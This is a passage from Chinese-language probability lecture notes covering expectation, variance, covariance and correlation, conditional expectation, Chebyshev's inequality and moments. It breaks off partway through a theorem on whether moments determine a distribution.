\]</div>
<p>即数学期望不会超过随机变量的取值范围。</p>
<ul>
<li><mark class="critic">线性运算</mark></li>
</ul>
<div class="arithmatex">\[
    E(a+bY)=a+bE(Y)
\]</div>
<p>从求和和积分的性质可以得到。</p>
<ul>
<li><mark class="critic">加法定理</mark></li>
</ul>
<p>由<a href="http://www.kailqq.cc/NOTE/Probability/second/#_19-etaxi_1xi_2">随机变量加法的分布</a></p>
<p>假设 <span class="arithmatex">\((X, Y) \sim p(x, y)\)</span>，那么 <span class="arithmatex">\(Z = X + Y\)</span> 具有密度</p>
<div class="arithmatex">\[
p_Z(z) = \int_{-\infty}^{\infty} p(x, z - x) dx
\]</div>
<p>所以</p>
<div class="arithmatex">\[
E(X + Y) = \int_{-\infty}^{\infty} z p_Z(z) dz
\]</div>
<div class="arithmatex">\[\begin{align*}
E(X + Y) &amp;= \int_{-\infty}^{\infty} z p_Z(z) dz \\
&amp;= \int_{-\infty}^{\infty} z \int_{-\infty}^{\infty} p(x, z - x) dx dz\\
&amp;= \int_{-\infty}^{\infty} \int_{-\infty}^{\infty} (x + y) p(x, y) dx dy\\
&amp;= \int_{-\infty}^{\infty} \int_{-\infty}^{\infty} x p(x, y) dx dy + \int_{-\infty}^{\infty} \int_{-\infty}^{\infty} y p(x, y) dx dy\\
&amp;= \int_{-\infty}^{\infty} x p_X(x) dx + \int_{-\infty}^{\infty} y p_Y(y) dy\\
&amp;= E X + E Y
\end{align*}\]</div>
<p>推广：</p>
<div class="arithmatex">\[
E(a_1 X_1 + a_2 X_2 + \cdots + a_m X_m) = a_1 E X_1 + a_2 E X_2 + \cdots + a_m E X_m
\]</div>
<div class="admonition example">
<p class="admonition-title">应用</p>
<p>假设 <span class="arithmatex">\(X_1, X_2, \dots, X_m\)</span> 是非负、独立同分布的随机变量，求</p>
<div class="arithmatex">\[
E \frac{X_1 + \cdots + X_k}{X_1 + \cdots + X_m}
\]</div>
<div class="arithmatex">\[
E \frac{X_1}{X_1 + \cdots + X_m} = \cdots = E \frac{X_m}{X_1 + \cdots + X_m}
\]</div>
<p>存在，有限。另外，</p>
<div class="arithmatex">\[\begin{align*}
1 &amp;= E \frac{X_1 + \cdots + X_m}{X_1 + \cdots + X_m}\\
&amp;= E \frac{X_1}{X_1 + \cdots + X_m} + \cdots + E \frac{X_m}{X_1 + \cdots + X_m}\\
&amp;= m \cdot E \frac{X_1}{X_1 + \cdots + X_m}\\
\end{align*}\]</div>
<p>所以，</p>
<div class="arithmatex">\[
E \frac{X_1}{X_1 + \cdots + X_m} = \frac{1}{m}
\Rightarrow E \frac{X_1 + \cdots + X_k}{X_1 + \cdots + X_m} = \frac{k}{m}
\]</div>
<p><strong>加法定理计算期望</strong></p>
<p>令 <span class="arithmatex">\( N \)</span> 是产品总数，<span class="arithmatex">\( M \)</span> 是次品数，现抽取 <span class="arithmatex">\( n \)</span> 件产品检查，其中 <span class="arithmatex">\( n \leq M \)</span>。<br />
令 <span class="arithmatex">\( S_n \)</span> 表示 <span class="arithmatex">\( n \)</span> 件抽查产品中次品的个数。那么</p>
<div class="arithmatex">\[
P(S_n = k) = \frac{\binom{M}{k} \binom{N - M}{n - k}}{\binom{N}{n}}
\]</div>
<p>下面给出 <span class="arithmatex">\( X \)</span> 的另一种表示：令 <span class="arithmatex">\( \xi_i \)</span> 表示第 <span class="arithmatex">\( i \)</span>-次抽检时次品个数，</p>
<div class="arithmatex">\[
X_i = 
\begin{cases}
1, &amp; p \\
0, &amp; 1 - p
\end{cases}
\quad i = 1, 2, \dots, n，\operatorname{同分布，但是不独立}
\]</div>
<p>那么</p>
<div class="arithmatex">\[
S_n = \sum_{i=1}^n X_i 
\]</div>
<div class="arithmatex">\[
E S_n = \sum_{i=1}^n E X_i = n \frac{M}{N}
\]</div>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p><span class="arithmatex">\(X_i\)</span>指第<span class="arithmatex">\(i\)</span>次抽到的是不是次品，这相当于抽奖，无论抽奖顺序是什么，每个人抽到的概率都是一样的，所以<span class="arithmatex">\(X_i\)</span>是同分布的，但是不独立。</p>
</div>
</div>
<p>如果随机变量<span class="arithmatex">\(X\)</span>和<span class="arithmatex">\(Y\)</span>独立，那么<span class="arithmatex">\(E(XY)=E(X)E(Y)\)</span>，如果<span class="arithmatex">\(E(XY)=E(X)E(Y)\)</span>，并不一定有<span class="arithmatex">\(X\)</span>和<span class="arithmatex">\(Y\)</span>独立。</p>
<h3 id="note-probability-third-_4">随机变量函数的数学期望<a class="headerlink" href="#note-probability-third-_4" title="Permanent link">&para;</a></h3>
<p>随机变量函数的数学期望可以用以下公式来定义：</p>
<p><span class="arithmatex">\((\Omega,\mathcal{F},P)\)</span>是一个概率空间, <span class="arithmatex">\(X:\Omega \to \mathbf{R}\)</span>是一个随机变量，<span class="arithmatex">\( g(X) \)</span> 是 <span class="arithmatex">\( X \)</span> 的一个实值可测函数，那么 <span class="arithmatex">\( g(X) \)</span> 的数学期望 <span class="arithmatex">\( E[g(X)] \)</span> 定义为：</p>
<div class="tabbed-set tabbed-alternate" data-tabs="2:2"><input checked="checked" id="note-probability-third-_4-离散型随机变量" name="note-probability-third-__tabbed_2" type="radio" /><input id="note-probability-third-_4-连续型随机变量" name="note-probability-third-__tabbed_2" type="radio" /><div class="tabbed-labels"><label for="note-probability-third-_4-离散型随机变量">离散型随机变量</label><label for="note-probability-third-_4-连续型随机变量">连续型随机变量</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<p>期望 <span class="arithmatex">\( E[g(X)] \)</span> 为：</p>
<div class="arithmatex">\[
 E[g(X)] = \sum_{x} g(x) P(X = x)
\]</div>
<p>其中 <span class="arithmatex">\( P(X = x) \)</span> 是 <span class="arithmatex">\( X \)</span> 取值为 <span class="arithmatex">\( x \)</span> 的概率。</p>
</div>
<div class="tabbed-block">
<p>期望 <span class="arithmatex">\( E[g(X)] \)</span> 为：</p>
<div class="arithmatex">\[
 E[g(X)] = \int_{-\infty}^{\infty} g(x) f_X(x) \, dx
\]</div>
<p>其中 <span class="arithmatex">\( f_X(x) \)</span> 是 <span class="arithmatex">\( X \)</span> 的概率密度函数。</p>
<p>如果<span class="arithmatex">\(X\)</span>有分布函数，那么</p>
<div class="arithmatex">\[
 E[g(X)] = \int_{-\infty}^{\infty} g(x) f_X(x) \, dx= \int_{-\infty}^{\infty} g(x) dF_X(x)
\]</div>
</div>
</div>
</div>
<h2 id="note-probability-third-_5">方差<a class="headerlink" href="#note-probability-third-_5" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>方差是用来衡量随机变量偏离其均值的程度的指标。设 <span class="arithmatex">\( X \)</span> 是一个随机变量，其数学期望为 <span class="arithmatex">\( E(X) \)</span>，则 <span class="arithmatex">\( X \)</span> 的方差记作 <span class="arithmatex">\( \operatorname{Var}(X) \)</span> 或 <span class="arithmatex">\( \sigma^2 \)</span>，定义如下：</p>
<div class="arithmatex">\[
\operatorname{Var}(X) = E[(X - E(X))^2]
\]</div>
</div>
<p>方差定义的是随机变量 <span class="arithmatex">\( X \)</span> 与其均值 <span class="arithmatex">\( E(X) \)</span> 偏差的平方的期望。它反映了 <span class="arithmatex">\( X \)</span> 取值的分散程度。方差越大，说明 <span class="arithmatex">\( X \)</span> 的取值离均值越远，分散性越大；方差越小，说明 <span class="arithmatex">\( X \)</span> 的取值集中在均值附近，分散性较小。</p>
<p><span class="arithmatex">\(\sqrt{\operatorname{Var}(X)}\)</span> 称为随机变量 <span class="arithmatex">\( X \)</span> 的标准差，记作<span class="arithmatex">\(\sigma\)</span></p>
<div class="admonition property">
<p class="admonition-title">常见分布的方差</p>
<div class="tabbed-set tabbed-alternate" data-tabs="3:7"><input checked="checked" id="note-probability-third-_5-二项分布" name="note-probability-third-__tabbed_3" type="radio" /><input id="note-probability-third-_5-泊松分布" name="note-probability-third-__tabbed_3" type="radio" /><input id="note-probability-third-_5-几何分布" name="note-probability-third-__tabbed_3" type="radio" /><input id="note-probability-third-_5-均匀分布" name="note-probability-third-__tabbed_3" type="radio" /><input id="note-probability-third-_5-指数分布" name="note-probability-third-__tabbed_3" type="radio" /><input id="note-probability-third-_5-正态分布" name="note-probability-third-__tabbed_3" type="radio" /><input id="note-probability-third-_5-超几何分布" name="note-probability-third-__tabbed_3" type="radio" /><div class="tabbed-labels"><label for="note-probability-third-_5-二项分布">二项分布</label><label for="note-probability-third-_5-泊松分布">泊松分布</label><label for="note-probability-third-_5-几何分布">几何分布</label><label for="note-probability-third-_5-均匀分布">均匀分布</label><label for="note-probability-third-_5-指数分布">指数分布</label><label for="note-probability-third-_5-正态分布">正态分布</label><label for="note-probability-third-_5-超几何分布">超几何分布</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<p>若<span class="arithmatex">\(X\sim B(n,p)\)</span>，则</p>
<div class="arithmatex">\[\operatorname{Var}(X)=np(1-p)\]</div>
</div>
<div class="tabbed-block">
<p>若<span class="arithmatex">\(X\sim P(\lambda)\)</span>，则</p>
<div class="arithmatex">\[\operatorname{Var}(X)=\lambda\]</div>
<p>对于泊松分布，方差等于数学期望，这是泊松分布的一个特性。</p>
</div>
<div class="tabbed-block">
<p>若<span class="arithmatex">\(X\sim G(p)\)</span>，则</p>
<div class="arithmatex">\[\operatorname{Var}(X)=\dfrac{1-p}{p^2}\]</div>
</div>
<div class="tabbed-block">
<p>若<span class="arithmatex">\(X\sim U(a,b)\)</span>，则</p>
<div class="arithmatex">\[\operatorname{Var}(X)=\dfrac{(b-a)^2}{12}\]</div>
</div>
<div class="tabbed-block">
<p>若<span class="arithmatex">\(X\sim E(\lambda)\)</span>，则</p>
<div class="arithmatex">\[\operatorname{Var}(X)=\dfrac{1}{\lambda^2}\]</div>
</div>
<div class="tabbed-block">
<p>若<span class="arithmatex">\(X\sim N(\mu,\sigma^2)\)</span>，则</p>
<div class="arithmatex">\[\operatorname{Var}(X)=\sigma^2\]</div>
</div>
<div class="tabbed-block">
<p>若<span class="arithmatex">\(X\sim H(N,M,n)\)</span>，则</p>
<div class="arithmatex">\[\operatorname{Var}(X)=n\dfrac{M}{N}\dfrac{N-M}{N}\dfrac{N-n}{N-1}\]</div>
</div>
</div>
</div>
</div>
<h3 id="note-probability-third-_6">计算公式<a class="headerlink" href="#note-probability-third-_6" title="Permanent link">&para;</a></h3>
<p>可以通过以下公式计算方差：</p>
<div class="arithmatex">\[
\operatorname{Var}(X) = E(X^2) - [E(X)]^2
\]</div>
<div class="admonition proof">
<p class="admonition-title">Proof</p>
<p>方差的定义是：</p>
<div class="arithmatex">\[
\operatorname{Var}(X) = E[(X - E(X))^2]
\]</div>
<p>展开括号，得到：</p>
<div class="arithmatex">\[
\operatorname{Var}(X) = E[X^2 - 2X \cdot E(X) + (E(X))^2]
\]</div>
<p>利用期望的线性性质，得到：</p>
<div class="arithmatex">\[
\operatorname{Var}(X) = E(X^2) - 2 E(X) \cdot E(X) + (E(X))^2
\]</div>
<p>由于 <span class="arithmatex">\( E(X) \)</span> 是一个常数，所以 <span class="arithmatex">\( E(X) \cdot E(X) = [E(X)]^2 \)</span>，因此可以简化为：</p>
<div class="arithmatex">\[
\operatorname{Var}(X) = E(X^2) - [E(X)]^2
\]</div>
</div>
<p>该公式表明，计算方差时可以通过求 <span class="arithmatex">\( X \)</span> 的平方的期望 <span class="arithmatex">\( E(X^2) \)</span> 减去 <span class="arithmatex">\( X \)</span> 的期望的平方 <span class="arithmatex">\( [E(X)]^2 \)</span> 来得到。这种形式通常更方便，尤其是在 <span class="arithmatex">\( E(X) \)</span> 和 <span class="arithmatex">\( E(X^2) \)</span> 容易求得的情况下，可以简化计算。</p>
<p>其中：</p>
<ul>
<li>
<p><span class="arithmatex">\( E(X^2) \)</span> 是 <span class="arithmatex">\( X \)</span> 的平方的期望，即二阶矩。</p>
</li>
<li>
<p><span class="arithmatex">\( [E(X)]^2 \)</span> 是 <span class="arithmatex">\( X \)</span> 的期望的平方。</p>
</li>
</ul>
<h3 id="note-probability-third-_7">方差的性质<a class="headerlink" href="#note-probability-third-_7" title="Permanent link">&para;</a></h3>
<ul>
<li><mark class="critic">非负性</mark>：</li>
</ul>
<p>方差总是非负的，即 <span class="arithmatex">\( \operatorname{Var}(X) \geq 0 \)</span>。</p>
<ul>
<li><mark class="critic">平移不变性</mark></li>
</ul>
<p>若 <span class="arithmatex">\( c \)</span> 为常数，则 <span class="arithmatex">\( \operatorname{Var}(X + c) = \operatorname{Var}(X) \)</span>。</p>
<ul>
<li><mark class="critic">方差的线性变换</mark></li>
</ul>
<p>对于独立随机变量 <span class="arithmatex">\( Y \)</span> ，以及常数 <span class="arithmatex">\( a \)</span> 和 <span class="arithmatex">\( b \)</span>，有</p>
<div class="arithmatex">\[
   \operatorname{Var}(a + bY) = b^2 \operatorname{Var}(Y)
\]</div>
<ul>
<li><mark class="critic">方差的加法</mark></li>
</ul>
<p>对于独立随机变量 <span class="arithmatex">\( X \)</span> 和 <span class="arithmatex">\( Y \)</span>，有</p>
<div class="arithmatex">\[
   \operatorname{Var}(X + Y) = \operatorname{Var}(X) + \operatorname{Var}(Y)+2\operatorname{Cov}(X,Y)
\]</div>
<p>其中，<span class="arithmatex">\( \operatorname{Cov}(X,Y) \)</span> 是 <span class="arithmatex">\( X \)</span> 和 <span class="arithmatex">\( Y \)</span> 的协方差，即</p>
<div class="arithmatex">\[
   \operatorname{Cov}(X,Y) = E[(X - E(X))(Y - E(Y))]=E(XY)-E(X)E(Y)
\]</div>
<p>如果<span class="arithmatex">\(X,Y\)</span>相互独立，则<span class="arithmatex">\(\operatorname{Cov}(X,Y)=0\)</span>，所以</p>
<div class="arithmatex">\[
   \operatorname{Var}(X + Y) = \operatorname{Var}(X) + \operatorname{Var}(Y)
\]</div>
<p>可推广到多个独立随机变量的情况。</p>
<h3 id="note-probability-third-_8">选择平均值的原因<a class="headerlink" href="#note-probability-third-_8" title="Permanent link">&para;</a></h3>
<p>在计算方差时，我们通常使用平均值作为中心点，而不是其他值。这是因为平均值是使方差最小的点。也就是说，对于任何实数 <span class="arithmatex">\( c \)</span>，有</p>
<div class="arithmatex">\[
   \operatorname{Var'}(X) = E[(X - c)^2] \geqslant E[(X - E(X))^2] = \operatorname{Var}(X)
\]</div>
<div class="admonition proof">
<p class="admonition-title">Proof</p>
<div class="arithmatex">\[\begin{align*}
 \operatorname{Var}(X)&amp;=E(X-EX)^2\\
    &amp;=E(X-c-(EX-c))^2\\
    &amp;=E(X-c)^2-2E(X-c)(EX-c)+E(EX-c)^2\\
    &amp;=E(X-c)^2-(EX-c)^2 \leqslant E(X-c)^2
\end{align*}\]</div>
</div>
<h3 id="note-probability-third-chebyschev">切比雪夫不等式(Chebyschev)<a class="headerlink" href="#note-probability-third-chebyschev" title="Permanent link">&para;</a></h3>
<p>设 <span class="arithmatex">\((\Omega, \mathcal{A}, P)\)</span> 是概率空间， <span class="arithmatex">\(X : \Omega \rightarrow \mathbb{R}\)</span> 是随机变量，那么对任意 <span class="arithmatex">\(\varepsilon &gt; 0\)</span>，</p>
<div class="arithmatex">\[
P(|X - EX| &gt; \varepsilon) \leqslant \frac{\operatorname{Var}(X)}{\varepsilon^2}
\]</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>切比雪夫不等式给出了随机变量偏离其均值大于某个精度的概率的上界。</p>
</div>
<p>仅取 <span class="arithmatex">\(X \sim p(x)\)</span> 加以证明。</p>
<div class="arithmatex">\[
P(|X - EX| &gt; \varepsilon) = \int_{x: |x - EX| &gt; \varepsilon} p(x) \, dx
\]</div>
<div class="arithmatex">\[
\leqslant \int_{x: |x - EX| &gt; \varepsilon} \frac{|x - EX|^2}{\varepsilon^2} p(x) \, dx
\]</div>
<div class="arithmatex">\[
\leqslant \frac{1}{\varepsilon^2} \int_{-\infty}^{\infty} |x - EX|^2 p(x) \, dx
\]</div>
<div class="arithmatex">\[
= \frac{\operatorname{Var}(X)}{\varepsilon^2}
\]</div>
<div class="admonition summary">
<p class="admonition-title">推广</p>
<p>若 <span class="arithmatex">\(f\)</span> 是单调不减严格正函数，那么</p>
<div class="arithmatex">\[
P(X &gt; \varepsilon) \leqslant \frac{E f(X)}{f(\varepsilon)}
\]</div>
<p>事实上，使用了Markov不等式:</p>
<div class="arithmatex">\[
P(X &gt; \varepsilon) \leqslant P(f(X) \geqslant f(\varepsilon)) \leqslant \frac{E f(X)}{f(\varepsilon)}
\]</div>
</div>
<h2 id="note-probability-third-_9">协方差矩阵<a class="headerlink" href="#note-probability-third-_9" title="Permanent link">&para;</a></h2>
<h3 id="note-probability-third-_10">均值向量<a class="headerlink" href="#note-probability-third-_10" title="Permanent link">&para;</a></h3>
<p>对于一个随机向量 <span class="arithmatex">\( X = (X_1, X_2, \dots, X_n) \)</span>，如果<span class="arithmatex">\(X_i\)</span>的数学期望存在；其均值向量 <span class="arithmatex">\( \mu \)</span> 定义为：</p>
<div class="arithmatex">\[
\mu = E(X) = (E(X_1), E(X_2), \dots, E(X_n))
\]</div>
<h3 id="note-probability-third-_11">协方差<a class="headerlink" href="#note-probability-third-_11" title="Permanent link">&para;</a></h3>
<p>假设<span class="arithmatex">\(X\)</span>和<span class="arithmatex">\(Y\)</span>是两个随机变量，且两者的数学期望和方差都存在，那么<span class="arithmatex">\(X\)</span>和<span class="arithmatex">\(Y\)</span>的协方差定义为：</p>
<div class="arithmatex">\[
\operatorname{Cov}(X, Y) = E[(X - E(X))(Y - E(Y))]
\]</div>
<p>协方差也可以表示为：</p>
<div class="arithmatex">\[
\operatorname{Cov}(X, Y) = E(XY) - E(X)E(Y)
\]</div>
<div class="admonition note">
<p class="admonition-title">Cauchy-Schwarz不等式</p>
<p>对于任意两个随机变量<span class="arithmatex">\(X\)</span>和<span class="arithmatex">\(Y\)</span>，有</p>
<div class="arithmatex">\[
    \operatorname{Cov}(X, Y)^2 \leq \operatorname{Var}(X) \operatorname{Var}(Y)
\]</div>
<div class="arithmatex">\[
    E[(X - E(X))(Y - E(Y))] \leqslant \sqrt{E[(X - E(X))^2]E[(Y - E(Y))^2]}
\]</div>
<p>运用任意实数<span class="arithmatex">\(t\)</span>,满足</p>
<div class="arithmatex">\[
    E[(|X|+t|Y|)^2] \geqslant 0
\]</div>
<p>展开利用二次函数的性质即可；</p>
</div>
<p>协方差矩阵为</p>
<div class="arithmatex">\[
\Sigma = \begin{bmatrix}
\operatorname{Var}(X_1) &amp; \operatorname{Cov}(X_1, X_2) &amp; \cdots &amp; \operatorname{Cov}(X_1, X_n) \\
\operatorname{Cov}(X_2, X_1) &amp; \operatorname{Var}(X_2) &amp; \cdots &amp; \operatorname{Cov}(X_2, X_n) \\
\vdots &amp; \vdots &amp; \ddots &amp; \vdots \\
\operatorname{Cov}(X_n, X_1) &amp; \operatorname{Cov}(X_n, X_2) &amp; \cdots &amp; \operatorname{Var}(X_n)
\end{bmatrix}
\]</div>
<p>对于二元随机变量 <span class="arithmatex">\( X = (X_1, X_2) \)</span>，协方差矩阵为</p>
<div class="arithmatex">\[
\Sigma = \begin{bmatrix}
\operatorname{Var}(X_1) &amp; \operatorname{Cov}(X_1, X_2) \\
\operatorname{Cov}(X_2, X_1) &amp; \operatorname{Var}(X_2)
\end{bmatrix}
\]</div>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>协方差矩阵是一个非负定矩阵，即对于任意非零列向量 <span class="arithmatex">\( a \)</span>，有 <span class="arithmatex">\( a^T \Sigma a \geq 0 \)</span>。</p>
</div>
<p>如果<span class="arithmatex">\(X\)</span>, <span class="arithmatex">\(Y\)</span>相互独立，此时 <span class="arithmatex">\(E(XY)=E(X)E(Y)\)</span> 那么<span class="arithmatex">\(\operatorname{Cov}(X, Y) = 0\)</span>，反之，如果<span class="arithmatex">\(\operatorname{Cov}(X, Y) = 0\)</span>，并不一定有<span class="arithmatex">\(X\)</span>和<span class="arithmatex">\(Y\)</span>相互独立，但是可以定义为<mark class="critic">不相关</mark>。</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>二元联合正态分布的协方差为<span class="arithmatex">\(\rho \sigma_1 \sigma_2\)</span></p>
</div>
<h3 id="note-probability-third-_12">相关系数<a class="headerlink" href="#note-probability-third-_12" title="Permanent link">&para;</a></h3>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>二元函数的相关系数（Correlation Coefficient）用来衡量两个随机变量 <span class="arithmatex">\( X \)</span> 和 <span class="arithmatex">\( Y \)</span> 之间的线性关系，其定义基于协方差和标准差，计算公式如下：</p>
<div class="arithmatex">\[
\rho(X, Y) = \frac{\operatorname{Cov}(X, Y)}{\sigma_X \cdot \sigma_Y}
\]</div>
<p>其中：</p>
<ul>
<li><span class="arithmatex">\(\operatorname{Cov}(X, Y)\)</span> 是 <span class="arithmatex">\( X \)</span> 和 <span class="arithmatex">\( Y \)</span> 的协方差，定义为：</li>
</ul>
<div class="arithmatex">\[
  \operatorname{Cov}(X, Y) = \mathbb{E}[(X - \mathbb{E}[X])(Y - \mathbb{E}[Y])] = \mathbb{E}[XY] - \mathbb{E}[X] \cdot \mathbb{E}[Y]
\]</div>
<ul>
<li><span class="arithmatex">\(\sigma_X\)</span> 和 <span class="arithmatex">\(\sigma_Y\)</span> 分别是 <span class="arithmatex">\( X \)</span> 和 <span class="arithmatex">\( Y \)</span> 的标准差，定义为：</li>
</ul>
<div class="arithmatex">\[
  \sigma_X = \sqrt{\operatorname{Var}(X)}, \quad \sigma_Y = \sqrt{\operatorname{Var}(Y)}
\]</div>
<p>其中方差为：</p>
<div class="arithmatex">\[
  \operatorname{Var}(X) = \mathbb{E}[(X - \mathbb{E}[X])^2]
\]</div>
<ol>
<li><strong>取值范围：</strong></li>
</ol>
<div class="arithmatex">\[
   -1 \leq \rho(X, Y) \leq 1
\]</div>
<ul>
<li>当 <span class="arithmatex">\(\rho(X, Y) = 1\)</span> 时，<span class="arithmatex">\( X \)</span> 和 <span class="arithmatex">\( Y \)</span> 完全正线性相关。</li>
<li>当 <span class="arithmatex">\(\rho(X, Y) = -1\)</span> 时，<span class="arithmatex">\( X \)</span> 和 <span class="arithmatex">\( Y \)</span> 完全负线性相关。</li>
<li>
<p>当 <span class="arithmatex">\(\rho(X, Y) = 0\)</span> 时，<span class="arithmatex">\( X \)</span> 和 <span class="arithmatex">\( Y \)</span> 没有线性关系，但不一定独立。</p>
</li>
<li>
<p><strong>无量纲性：</strong>
   <span class="arithmatex">\(\rho(X, Y)\)</span> 是一个无量纲量，反映的是两变量线性关系的强弱，与变量的量纲无关。</p>
</li>
<li>
<p><strong>对称性：</strong></p>
</li>
</ul>
<div class="arithmatex">\[
   \rho(X, Y) = \rho(Y, X)
\]</div>
<p>一般也用<span class="arithmatex">\(\gamma\)</span>来表示相关系数</p>
</div>
<h2 id="note-probability-third-_13">条件期望<a class="headerlink" href="#note-probability-third-_13" title="Permanent link">&para;</a></h2>
<p>对于两个随机变量X，Y，其条件期望定义为：</p>
<div class="tabbed-set tabbed-alternate" data-tabs="4:2"><input checked="checked" id="note-probability-third-_13-离散型" name="note-probability-third-__tabbed_4" type="radio" /><input id="note-probability-third-_13-连续型" name="note-probability-third-__tabbed_4" type="radio" /><div class="tabbed-labels"><label for="note-probability-third-_13-离散型">离散型</label><label for="note-probability-third-_13-连续型">连续型</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<p>给定<span class="arithmatex">\(Y=y_i\)</span>,<span class="arithmatex">\(X\)</span>的条件期望定义为</p>
<div class="arithmatex">\[
    E(X|Y=y_i)=\sum_{i=1}^\infty x_i P(X=x_i|Y=y_i)
\]</div>
<p>要求该级数绝对收敛</p>
<p>若给定<span class="arithmatex">\(X\)</span>,<span class="arithmatex">\(Y\)</span>的条件期望也是类似</p>
</div>
<div class="tabbed-block">
<div class="arithmatex">\[
    P(X=x|Y=y)=\dfrac{p(x,y)}{p_Y(y)}
\]</div>
<p>所以</p>
<div class="arithmatex">\[
    E(X=x|Y=y)=\int_{-\infty}^{+\infty} x  P(X=x|Y=y) dx
\]</div>
<p>要求该积分绝对可积</p>
<p>若给定<span class="arithmatex">\(X\)</span>,<span class="arithmatex">\(Y\)</span>的条件期望也是类似</p>
</div>
</div>
</div>
<h3 id="note-probability-third-_14">全期望公式<a class="headerlink" href="#note-probability-third-_14" title="Permanent link">&para;</a></h3>
<div class="arithmatex">\[
P(X = x_i, Y = y_j) = p_{ij}, \quad i, j = 1, 2, \ldots
\]</div>
<p>每一个 <span class="arithmatex">\(y_j\)</span>，对应一个条件期望 <span class="arithmatex">\(E(X|Y = y_j)\)</span>，即</p>
<div class="arithmatex">\[
y_j \rightarrow E(X|Y = y_j)
\]</div>
<p>定义</p>
<div class="arithmatex">\[
g(y_j) = E(X|Y = y_j)
\]</div>
<p>即</p>
<div class="arithmatex">\[
g(Y) = E(X|Y)
\]</div>
<p>它是 <span class="arithmatex">\(Y\)</span> 的函数，所以是随机变量。求 <span class="arithmatex">\(Eg(Y)\)</span>；</p>
<div class="arithmatex">\[
Eg(Y) = \sum_{j=1}^{\infty} g(y_j) P(Y = y_j)
\]</div>
<div class="arithmatex">\[
= \sum_{j=1}^{\infty} \sum_{i=1}^{\infty} x_i P(X = x_i | Y = y_j) P(Y = y_j)
\]</div>
<div class="arithmatex">\[
= \sum_{i=1}^{\infty} x_i \sum_{j=1}^{\infty} P(X = x_i | Y = y_j) P(Y = y_j)
\]</div>
<div class="arithmatex">\[
= \sum_{i=1}^{\infty} x_i P(X = x_i)
\]</div>
<div class="arithmatex">\[
= E X
\]</div>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p><span class="arithmatex">\(E(E(X|Y))=EX\)</span>,<span class="arithmatex">\(E(E(Y|X))=EY\)</span>
这个结论对于离散，随机，连续变量都成立</p>
</div>
<h3 id="note-probability-third-_15">矩<a class="headerlink" href="#note-probability-third-_15" title="Permanent link">&para;</a></h3>
<ul>
<li><strong>k 阶矩，k 阶中心矩</strong>:</li>
</ul>
<p>假设 <span class="arithmatex">\((\Omega, \mathcal{A}, P)\)</span> 概率空间，<span class="arithmatex">\(X: \Omega \to \mathbb{R}\)</span> 随机变量<br />
  如果 <span class="arithmatex">\(E|X|^k &lt; \infty, k \geqslant 1\)</span>，那么称</p>
<div class="arithmatex">\[
  E X^k, \quad k \text{ 阶矩 } k \geq 1
\]</div>
<div class="arithmatex">\[
  E(X - E X)^k, \quad k \text{ 阶中心矩 } k \geq 1
\]</div>
<div class="admonition example">
<p class="admonition-title">Example</p>
<div class="tabbed-set tabbed-alternate" data-tabs="5:2"><input checked="checked" id="note-probability-third-_15-正态分布" name="note-probability-third-__tabbed_5" type="radio" /><input id="note-probability-third-_15-泊松分布" name="note-probability-third-__tabbed_5" type="radio" /><div class="tabbed-labels"><label for="note-probability-third-_15-正态分布">正态分布</label><label for="note-probability-third-_15-泊松分布">泊松分布</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<p><span class="arithmatex">\( X \sim N(0, \sigma^2) \)</span>，那么</p>
<div class="arithmatex">\[
E|X|^k &lt; \infty, \quad k \geq 1
\]</div>
<p>并且</p>
<div class="arithmatex">\[
EX^{2k} = (2k - 1)!! \sigma^{2k}, \quad EX^{2k + 1} = 0, \quad k \geq 1
\]</div>
<div class="arithmatex">\[
EX^{2k} = \int_{-\infty}^{\infty} x^{2k} \frac{1}{\sqrt{2\pi}} e^{-\frac{x^2}{2}} \, dx
\]</div>
<div class="arithmatex">\[
= -\int_{-\infty}^{\infty} x^{2k - 1} \frac{1}{\sqrt{2\pi}} d e^{-\frac{x^2}{2}}
\]</div>
<div class="arithmatex">\[
= -x^{2k-1} \frac{1}{\sqrt{2\pi}} e^{-\frac{x^2}{2}} \bigg|_{-\infty}^{\infty} + (2k - 1) \int_{-\infty}^{\infty} x^{2k - 2} \frac{1}{\sqrt{2\pi}} e^{-\frac{x^2}{2}} \, dx
\]</div>
<div class="arithmatex">\[
= (2k - 1) E X^{2k - 2}
\]</div>
<div class="arithmatex">\[
EX^{2k} = (2k - 1) E X^{2k - 2} = \cdots = (2k - 1)(2k - 3) \cdots 1 = (2k - 1)!!
\]</div>
</div>
<div class="tabbed-block">
<p><span class="arithmatex">\( X \sim \mathcal{P}(\lambda) \)</span>，那么</p>
<div class="arithmatex">\[
E|X|^k &lt; \infty, \quad k \geq 1
\]</div>
<p>并且</p>
<div class="arithmatex">\[
E X (X - 1) \cdots (X - (k - 1)) = \lambda^k, \quad k \geq 1
\]</div>
<div class="arithmatex">\[
\downarrow
\]</div>
<div class="arithmatex">\[
E X^2 = E X (X - 1) + E X
\]</div>
<div class="arithmatex">\[
E X^3 = E X (X - 1)(X - 2) + 3 E X (X - 1) + E X
\]</div>
<div class="arithmatex">\[
E X^4 = E X (X - 1)(X - 2)(X - 3) + 6 E X (X - 1)(X - 2) + 7 E X (X - 1) + E X
\]</div>
<div class="arithmatex">\[
E X^k = E X (X - 1) \cdots (X - (k - 1)) + \cdots
\]</div>
</div>
</div>
</div>
</div>
<div class="admonition warining">
<p class="admonition-title">Warining</p>
<p>一般来说，随机变量任意K阶矩都相等，并不能保证随机变量的分布相同。但是正态分布和泊松分布可以由k阶矩来确定。</p>
</div>
<div class="admonition section">
<p class="admonition-title">定理</p>
<p>假设 <span class="arithmatex">\(X, Y\)</span> 是两个随机变量，并且对任意 <span class="arithmatex">\(k \geq 1\)</span>,</p>
<div class="arithmatex">\[
E X^k = E Y^k = m_k &lt; \infty
\]</div>
<p>如果下列三个条件之一成立：</p>
<p>(i)</p>
<div class="arithmatex">\[
\sum_{k=1}^{\infty} \frac{m_{2k} t^{2k}}{(2k)!} &lt; \infty, \quad \text{对某些 } t &gt; 0
\]</div>
<p>(ii)</p>
